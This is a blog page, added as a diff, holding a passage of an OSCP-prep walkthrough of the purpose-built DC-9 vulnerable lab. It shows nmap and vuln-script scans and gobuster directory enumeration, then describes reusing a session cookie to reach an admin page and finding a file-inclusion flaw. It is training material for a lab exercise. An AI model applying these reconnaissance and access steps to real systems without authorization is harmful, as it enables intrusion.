@@ -1,0 +1,770 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.png">
+  <link rel="icon" href="/img/icon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="So1Lupus">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="VULHUB-DC09-WalkthroughInformationDC-9 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing. The ultimate goal of this challenge is to ge">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Road-to-OSCP-5-DC09">
+<meta property="og:url" content="http://example.com/2023/04/13/Road-to-OSCP-5-DC09/index.html">
+<meta property="og:site_name" content="So1Lupus">
+<meta property="og:description" content="VULHUB-DC09-WalkthroughInformationDC-9 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing. The ultimate goal of this challenge is to ge">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/04/13/Road-to-OSCP-5-DC09/image-20230412215235471.png">
+<meta property="og:image" content="http://example.com/2023/04/13/Road-to-OSCP-5-DC09/image-20230412215351703.png">
+<meta property="og:image" content="http://example.com/2023/04/13/Road-to-OSCP-5-DC09/image-20230412215538449.png">
+<meta property="og:image" content="http://example.com/2023/04/13/Road-to-OSCP-5-DC09/image-20230412220042466.png">
+<meta property="og:image" content="http://example.com/2023/04/13/Road-to-OSCP-5-DC09/image-20230412220335949.png">
+<meta property="og:image" content="http://example.com/2023/04/13/Road-to-OSCP-5-DC09/image-20230412221247878.png">
+<meta property="og:image" content="http://example.com/2023/04/13/Road-to-OSCP-5-DC09/image-20230412220902699.png">
+<meta property="og:image" content="http://example.com/2023/04/13/Road-to-OSCP-5-DC09/image-20230412221104078.png">
+<meta property="og:image" content="http://example.com/2023/04/13/Road-to-OSCP-5-DC09/image-20230412221532885.png">
+<meta property="og:image" content="http://example.com/2023/04/13/Road-to-OSCP-5-DC09/image-20230412222508505.png">
+<meta property="og:image" content="http://example.com/2023/04/13/Road-to-OSCP-5-DC09/image-20230412222646923.png">
+<meta property="og:image" content="http://example.com/2023/04/13/Road-to-OSCP-5-DC09/image-20230412223022323.png">
+<meta property="og:image" content="http://example.com/2023/04/13/Road-to-OSCP-5-DC09/image-20230412223057976.png">
+<meta property="og:image" content="http://example.com/2023/04/13/Road-to-OSCP-5-DC09/proof.png">
+<meta property="article:published_time" content="2023-04-13T03:51:30.000Z">
+<meta property="article:modified_time" content="2023-04-13T03:56:42.000Z">
+<meta property="article:author" content="So1Lupus">
+<meta property="article:tag" content="OSCP备考">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2023/04/13/Road-to-OSCP-5-DC09/image-20230412215235471.png">
+  
+  
+  
+  <title>Road-to-OSCP-5-DC09 - So1Lupus</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>So1Lupus</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Road-to-OSCP-5-DC09"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-04-13 11:51" pubdate>
+          2023年4月13日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          9.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          77 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Road-to-OSCP-5-DC09</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="VULHUB-DC09-Walkthrough"><a href="#VULHUB-DC09-Walkthrough" class="headerlink" title="VULHUB-DC09-Walkthrough"></a>VULHUB-DC09-Walkthrough</h1><h2 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h2><p>DC-9 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</p>
+<p>The ultimate goal of this challenge is to get root and to read the one and only flag.</p>
+<p>Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</p>
+<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><h3 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h3><p>Firstly ,we should konw target’s IP.So we use nmap to detect it.</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vim">$<span class="hljs-keyword">nmap</span> -<span class="hljs-keyword">sn</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">137.0</span>/<span class="hljs-number">24</span>                                                                                                            <br>Starting Nmap <span class="hljs-number">7.93</span> ( https://<span class="hljs-keyword">nmap</span>.org ) at <span class="hljs-number">2023</span>-<span class="hljs-number">04</span>-<span class="hljs-number">12</span> <span class="hljs-number">21</span>:<span class="hljs-number">17</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">137.2</span><br>Host <span class="hljs-keyword">is</span> <span class="hljs-keyword">up</span> (<span class="hljs-number">0.00048</span>s latency).<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">137.3</span><br>Host <span class="hljs-keyword">is</span> <span class="hljs-keyword">up</span> (<span class="hljs-number">0.00043</span>s latency).<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><br>Host <span class="hljs-keyword">is</span> <span class="hljs-keyword">up</span> (<span class="hljs-number">0.00039</span>s latency).<br>Nmap done: <span class="hljs-number">256</span> IP addresses (<span class="hljs-number">3</span> hosts <span class="hljs-keyword">up</span>) scanned in <span class="hljs-number">4.14</span> seconds<br></code></pre></td></tr></table></figure>
+
+<p>And now we know it was 192.168.137.4.</p>
+<h3 id="Port-x2F-Service"><a href="#Port-x2F-Service" class="headerlink" title="Port&#x2F;Service"></a>Port&#x2F;Service</h3><p>Time to run a TCP-SYN scan to scan for open TCP ports on targets:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nmap --min-rate <span class="hljs-number">10000</span> -p- <span class="hljs-number">192.168.137.4</span>    -<span class="hljs-literal">oN</span> dc9-tcp-nmap-<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p>And we get such a result:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache">                                                                                          <br><span class="hljs-attribute">Starting</span> Nmap <span class="hljs-number">7</span>.<span class="hljs-number">93</span> ( https://nmap.org ) at <span class="hljs-number">2023</span>-<span class="hljs-number">04</span>-<span class="hljs-number">12</span> <span class="hljs-number">21</span>:<span class="hljs-number">34</span> CST<br><span class="hljs-attribute">Nmap</span> scan report for <span class="hljs-number">192.168.137.4</span><br><span class="hljs-attribute">Host</span> is up (<span class="hljs-number">0</span>.<span class="hljs-number">000071</span>s latency).<br><span class="hljs-attribute">Not</span> shown: <span class="hljs-number">65533</span> closed tcp ports (reset)<br><span class="hljs-attribute">PORT</span>   STATE SERVICE<br><span class="hljs-attribute">22</span>/tcp filtered  ssh<br><span class="hljs-attribute">80</span>/tcp open  http<br><span class="hljs-attribute">MAC</span> Address: <span class="hljs-number">00</span>:<span class="hljs-number">0</span>C:<span class="hljs-number">29</span>:<span class="hljs-number">10</span>:DF:<span class="hljs-number">0</span>B (VMware)<br><br><span class="hljs-attribute">Nmap</span> done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">1</span>.<span class="hljs-number">29</span> seconds<br><br></code></pre></td></tr></table></figure>
+
+<p>Then try to get more details for this two ports.Port 22 is filtered.Maybe there is a <strong>Port Knock</strong>.To tell the truth,i know that after searching in the Internet.Port 80 is open,so we can go web pentest later.</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">nmap -<span class="hljs-variable">sV</span> -<span class="hljs-variable">sC</span> -p22,<span class="hljs-number">80</span> <span class="hljs-number">192.168</span><span class="hljs-number">.137</span><span class="hljs-number">.4</span> -oN dc9-tcp-nmap<span class="hljs-number">-2</span><br>PORT   STATE  SERVICE VERSION<br><span class="hljs-number">22</span>/tcp filtered ssh<br><span class="hljs-number">80</span>/tcp <span class="hljs-built_in">open</span>   <span class="hljs-keyword">http</span>    Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.38</span> ((Debian))<br>|<span class="hljs-title">_http-title</span>: Example.com - Staff Details - Welcome<br>|<span class="hljs-title">_http-server-header</span>: Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.38</span> (Debian)<br><br>Service detection performed. Please report <span class="hljs-keyword">any</span> incorrect results <span class="hljs-keyword">at</span> <span class="hljs-keyword">https</span>://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">6.68</span> <span class="hljs-built_in">seconds</span><br></code></pre></td></tr></table></figure>
+
+ <figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs 1c">namp -sV --script=vuln -p22,<span class="hljs-number">80</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><br>Starting Nmap <span class="hljs-number">7.93</span> ( https:<span class="hljs-comment">//nmap.org ) at 2023-04-12 21:41 CST</span><br>Nmap scan report for <span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><br>Host is up (<span class="hljs-number">0.00036</span>s latency).<br><br>PORT   STATE  SERVICE<br><span class="hljs-number">22</span>/tcp filtered ssh<br><span class="hljs-number">80</span>/tcp open   http<br><span class="hljs-string">|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|   /css/: Potentially interesting directory w/ listing on &#x27;apache/2.4.38 (debian)&#x27;</span><br><span class="hljs-string">|_  /includes/: Potentially interesting directory w/ listing on &#x27;apache/2.4.38 (debian)&#x27;</span><br><span class="hljs-string">| http-csrf: </span><br><span class="hljs-string">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.137.4</span><br><span class="hljs-string">|   Found the following possible CSRF vulnerabilities: </span><br><span class="hljs-string">|     </span><br><span class="hljs-string">|     Path: http://192.168.137.4:80/search.php</span><br><span class="hljs-string">|     Form id: </span><br><span class="hljs-string">|     Form action: results.php</span><br><span class="hljs-string">|     </span><br><span class="hljs-string">|     Path: http://192.168.137.4:80/manage.php</span><br><span class="hljs-string">|     Form id: </span><br><span class="hljs-string">|_    Form action: manage.php</span><br><span class="hljs-string">|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.</span><br><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">31.20</span> seconds<br></code></pre></td></tr></table></figure>
+
+<p>Now,we get some information about target like <code>results.php</code>,<code>manage.php</code>,etc.</p>
+<h2 id="Web-pentest"><a href="#Web-pentest" class="headerlink" title="Web pentest"></a>Web pentest</h2><p>go web scan</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">gobuster</span> <span class="hljs-string">dir</span> <span class="hljs-string">-u</span> <span class="hljs-number">192.168</span><span class="hljs-number">.137</span><span class="hljs-number">.4</span> <span class="hljs-string">-w</span> <span class="hljs-string">/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt</span>           <br><span class="hljs-string">===============================================================</span><br><span class="hljs-string">Gobuster</span> <span class="hljs-string">v3.3</span><br><span class="hljs-string">by</span> <span class="hljs-string">OJ</span> <span class="hljs-string">Reeves</span> <span class="hljs-string">(@TheColonial)</span> <span class="hljs-string">&amp;</span> <span class="hljs-string">Christian</span> <span class="hljs-string">Mehlmauer</span> <span class="hljs-string">(@firefart)</span><br><span class="hljs-string">===============================================================</span><br>[<span class="hljs-string">+</span>] <span class="hljs-attr">Url:</span>                     <span class="hljs-string">http://192.168.137.4</span><br>[<span class="hljs-string">+</span>] <span class="hljs-attr">Method:</span>                  <span class="hljs-string">GET</span><br>[<span class="hljs-string">+</span>] <span class="hljs-attr">Threads:</span>                 <span class="hljs-number">10</span><br>[<span class="hljs-string">+</span>] <span class="hljs-attr">Wordlist:</span>                <span class="hljs-string">/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt</span><br>[<span class="hljs-string">+</span>] <span class="hljs-attr">Negative Status codes:</span>   <span class="hljs-number">404</span><br>[<span class="hljs-string">+</span>] <span class="hljs-attr">User Agent:</span>              <span class="hljs-string">gobuster/3.3</span><br>[<span class="hljs-string">+</span>] <span class="hljs-attr">Timeout:</span>                 <span class="hljs-string">10s</span><br><span class="hljs-string">===============================================================</span><br><span class="hljs-number">2023</span><span class="hljs-string">/04/12</span> <span class="hljs-number">21</span><span class="hljs-string">:44:17</span> <span class="hljs-string">Starting</span> <span class="hljs-string">gobuster</span> <span class="hljs-string">in</span> <span class="hljs-string">directory</span> <span class="hljs-string">enumeration</span> <span class="hljs-string">mode</span><br><span class="hljs-string">===============================================================</span><br><span class="hljs-string">/index.php</span>            <span class="hljs-string">(Status:</span> <span class="hljs-number">200</span><span class="hljs-string">)</span> [<span class="hljs-attr">Size:</span> <span class="hljs-number">917</span>]<br><span class="hljs-string">/search.php</span>           <span class="hljs-string">(Status:</span> <span class="hljs-number">200</span><span class="hljs-string">)</span> [<span class="hljs-attr">Size:</span> <span class="hljs-number">1091</span>]<br><span class="hljs-string">/config.php</span>           <span class="hljs-string">(Status:</span> <span class="hljs-number">200</span><span class="hljs-string">)</span> [<span class="hljs-attr">Size:</span> <span class="hljs-number">0</span>]<br><span class="hljs-string">/.htaccess</span>            <span class="hljs-string">(Status:</span> <span class="hljs-number">403</span><span class="hljs-string">)</span> [<span class="hljs-attr">Size:</span> <span class="hljs-number">278</span>]<br><span class="hljs-string">/logout.php</span>           <span class="hljs-string">(Status:</span> <span class="hljs-number">302</span><span class="hljs-string">)</span> [<span class="hljs-attr">Size:</span> <span class="hljs-number">0</span>] [<span class="hljs-string">--&gt;</span> <span class="hljs-string">manage.php</span>]<br><span class="hljs-string">/.</span>                    <span class="hljs-string">(Status:</span> <span class="hljs-number">200</span><span class="hljs-string">)</span> [<span class="hljs-attr">Size:</span> <span class="hljs-number">917</span>]<br><span class="hljs-string">/.html</span>                <span class="hljs-string">(Status:</span> <span class="hljs-number">403</span><span class="hljs-string">)</span> [<span class="hljs-attr">Size:</span> <span class="hljs-number">278</span>]<br><span class="hljs-string">/results.php</span>          <span class="hljs-string">(Status:</span> <span class="hljs-number">200</span><span class="hljs-string">)</span> [<span class="hljs-attr">Size:</span> <span class="hljs-number">1056</span>]<br><span class="hljs-string">/.php</span>                 <span class="hljs-string">(Status:</span> <span class="hljs-number">403</span><span class="hljs-string">)</span> [<span class="hljs-attr">Size:</span> <span class="hljs-number">278</span>]<br><span class="hljs-string">/manage.php</span>           <span class="hljs-string">(Status:</span> <span class="hljs-number">200</span><span class="hljs-string">)</span> [<span class="hljs-attr">Size:</span> <span class="hljs-number">1210</span>]<br><span class="hljs-string">/display.php</span>          <span class="hljs-string">(Status:</span> <span class="hljs-number">200</span><span class="hljs-string">)</span> [<span class="hljs-attr">Size:</span> <span class="hljs-number">2961</span>]<br><span class="hljs-string">/welcome.php</span>          <span class="hljs-string">(Status:</span> <span class="hljs-number">302</span><span class="hljs-string">)</span> [<span class="hljs-attr">Size:</span> <span class="hljs-number">0</span>] [<span class="hljs-string">--&gt;</span> <span class="hljs-string">manage.php</span>]<br><span class="hljs-string">/.htpasswd</span>            <span class="hljs-string">(Status:</span> <span class="hljs-number">403</span><span class="hljs-string">)</span> [<span class="hljs-attr">Size:</span> <span class="hljs-number">278</span>]<br><span class="hljs-string">/.htm</span>                 <span class="hljs-string">(Status:</span> <span class="hljs-number">403</span><span class="hljs-string">)</span> [<span class="hljs-attr">Size:</span> <span class="hljs-number">278</span>]<br><span class="hljs-string">/session.php</span>          <span class="hljs-string">(Status:</span> <span class="hljs-number">302</span><span class="hljs-string">)</span> [<span class="hljs-attr">Size:</span> <span class="hljs-number">0</span>] [<span class="hljs-string">--&gt;</span> <span class="hljs-string">manage.php</span>]<br><span class="hljs-string">/.htpasswds</span>           <span class="hljs-string">(Status:</span> <span class="hljs-number">403</span><span class="hljs-string">)</span> [<span class="hljs-attr">Size:</span> <span class="hljs-number">278</span>]<br><span class="hljs-string">/.htgroup</span>             <span class="hljs-string">(Status:</span> <span class="hljs-number">403</span><span class="hljs-string">)</span> [<span class="hljs-attr">Size:</span> <span class="hljs-number">278</span>]<br><span class="hljs-string">/wp-forum.phps</span>        <span class="hljs-string">(Status:</span> <span class="hljs-number">403</span><span class="hljs-string">)</span> [<span class="hljs-attr">Size:</span> <span class="hljs-number">278</span>]<br><span class="hljs-string">/.htaccess.bak</span>        <span class="hljs-string">(Status:</span> <span class="hljs-number">403</span><span class="hljs-string">)</span> [<span class="hljs-attr">Size:</span> <span class="hljs-number">278</span>]<br><span class="hljs-string">/.htuser</span>              <span class="hljs-string">(Status:</span> <span class="hljs-number">403</span><span class="hljs-string">)</span> [<span class="hljs-attr">Size:</span> <span class="hljs-number">278</span>]<br><span class="hljs-string">/.ht</span>                  <span class="hljs-string">(Status:</span> <span class="hljs-number">403</span><span class="hljs-string">)</span> [<span class="hljs-attr">Size:</span> <span class="hljs-number">278</span>]<br><span class="hljs-string">/.htc</span>                 <span class="hljs-string">(Status:</span> <span class="hljs-number">403</span><span class="hljs-string">)</span> [<span class="hljs-attr">Size:</span> <span class="hljs-number">278</span>]<br><span class="hljs-string">/.htaccess.old</span>        <span class="hljs-string">(Status:</span> <span class="hljs-number">403</span><span class="hljs-string">)</span> [<span class="hljs-attr">Size:</span> <span class="hljs-number">278</span>]<br><span class="hljs-string">/.htacess</span>             <span class="hljs-string">(Status:</span> <span class="hljs-number">403</span><span class="hljs-string">)</span> [<span class="hljs-attr">Size:</span> <span class="hljs-number">278</span>]<br><span class="hljs-attr">Progress:</span> <span class="hljs-number">20866</span> <span class="hljs-string">/</span> <span class="hljs-number">37051</span> <span class="hljs-string">(56.32%)[ERROR]</span> <span class="hljs-number">2023</span><span class="hljs-string">/04/12</span> <span class="hljs-number">21</span><span class="hljs-string">:44:19</span> [<span class="hljs-type">!]</span> <span class="hljs-string">parse</span> <span class="hljs-string">&quot;http://192.168.137.4/directory\t\te.g.&quot;</span><span class="hljs-string">:</span> <span class="hljs-attr">net/url:</span> <span class="hljs-string">invalid</span> <span class="hljs-string">control</span> <span class="hljs-string">character</span> <span class="hljs-string">in</span> <span class="hljs-string">URL</span><br><span class="hljs-attr">Progress:</span> <span class="hljs-number">35281</span> <span class="hljs-string">/</span> <span class="hljs-number">37051</span> <span class="hljs-string">(95.22%)===============================================================</span><br><span class="hljs-number">2023</span><span class="hljs-string">/04/12</span> <span class="hljs-number">21</span><span class="hljs-string">:44:20</span> <span class="hljs-string">Finished</span><br><span class="hljs-string">============================================================</span><br></code></pre></td></tr></table></figure>
+
+<p>Some interesting files were finded.</p>
+<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs fortran">/<span class="hljs-built_in">index</span>.php            (<span class="hljs-keyword">Status</span>: <span class="hljs-number">200</span>) [<span class="hljs-built_in">Size</span>: <span class="hljs-number">917</span>]<br>/session.php          (<span class="hljs-keyword">Status</span>: <span class="hljs-number">302</span>) [<span class="hljs-built_in">Size</span>: <span class="hljs-number">0</span>] [--&gt; manage.php]<br>/search.php           (<span class="hljs-keyword">Status</span>: <span class="hljs-number">200</span>) [<span class="hljs-built_in">Size</span>: <span class="hljs-number">1091</span>]<br>/config.php           (<span class="hljs-keyword">Status</span>: <span class="hljs-number">200</span>) [<span class="hljs-built_in">Size</span>: <span class="hljs-number">0</span>]<br>/logout.php           (<span class="hljs-keyword">Status</span>: <span class="hljs-number">302</span>) [<span class="hljs-built_in">Size</span>: <span class="hljs-number">0</span>] [--&gt; manage.php]<br>/.                    (<span class="hljs-keyword">Status</span>: <span class="hljs-number">200</span>) [<span class="hljs-built_in">Size</span>: <span class="hljs-number">917</span>]<br>/results.php          (<span class="hljs-keyword">Status</span>: <span class="hljs-number">200</span>) [<span class="hljs-built_in">Size</span>: <span class="hljs-number">1056</span>]<br>/manage.php           (<span class="hljs-keyword">Status</span>: <span class="hljs-number">200</span>) [<span class="hljs-built_in">Size</span>: <span class="hljs-number">1210</span>]<br>/display.php          (<span class="hljs-keyword">Status</span>: <span class="hljs-number">200</span>) [<span class="hljs-built_in">Size</span>: <span class="hljs-number">2961</span>]<br>/welcome.php          (<span class="hljs-keyword">Status</span>: <span class="hljs-number">302</span>) [<span class="hljs-built_in">Size</span>: <span class="hljs-number">0</span>] [--&gt; manage.php]<br></code></pre></td></tr></table></figure>
+
+<p>So,let try them.</p>
+<p>And when try session.php,in the response packet,we found it’s set-Cookie.</p>
+<img src="/2023/04/13/Road-to-OSCP-5-DC09/image-20230412215235471.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>So,i try to add it to request packet to login into the manage.php.And,you guess what,it success.</p>
+<img src="/2023/04/13/Road-to-OSCP-5-DC09/image-20230412215351703.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>Then,we find some text in this page<em>File does not exist</em>.So i wonder if there a LFI?And finally get it .</p>
+<img src="/2023/04/13/Road-to-OSCP-5-DC09/image-20230412215538449.png" srcset="/img/loading.gif" lazyload class="">
